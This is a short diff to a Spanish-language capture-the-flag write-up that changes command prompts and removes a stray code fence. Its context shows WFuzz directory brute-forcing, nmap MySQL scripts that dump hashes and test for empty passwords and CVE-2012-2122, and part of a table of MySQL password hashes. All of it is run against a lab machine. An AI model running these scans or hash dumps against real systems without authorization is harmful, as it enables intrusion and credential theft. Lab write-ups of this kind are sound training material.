@@ -137,7 +137,7 @@ Title[Welcome to the land of pwnland], X-UA-Compatible[IE=edge]
 Y ahora, vamos a realizar un descubrimiento de directorios en la web con WFuzz
 
 ```bash
-└─$ wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.36/FUZZ    
+> wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.36/FUZZ    
 ```
 
 ```bash
@@ -202,7 +202,7 @@ templatemo
 Puesto que la máquina víctima tiene servidores SQL corriendo, vamos a realizar un análisis con nmap enfocado a descubrir posibles vectores en el servicio SQL:
  
 ```bash
-└─$ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.36
+> nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.36
 ```
 
 ```bash
@@ -393,7 +393,6 @@ MySQL [mysql]> select user, authentication_string from user;
                                           `PImejdBmtks1FgLOk2Xs9AuoeYwxdSRsy9NBNHTBJt1 |
 +------------------+------------------------------------------------------------------------+
 9 rows in set (0,002 sec)
-```
 ```
 
 -------------------------------------------------------------------------------
